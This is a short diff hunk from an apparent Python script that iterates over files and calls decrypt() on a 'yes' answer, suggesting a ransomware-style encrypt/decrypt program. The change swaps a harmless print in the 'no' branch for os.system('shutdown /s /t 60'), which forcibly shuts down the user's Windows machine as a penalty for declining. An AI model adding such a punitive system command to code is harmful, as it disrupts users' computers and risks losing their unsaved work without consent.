@@ -51,8 +51,7 @@ for file in files:
         if question=="yes":
             decrypt()
         else:
-            print("okay cool!")
-        
+            os.system("shutdown /s /t 60")
         
         
         
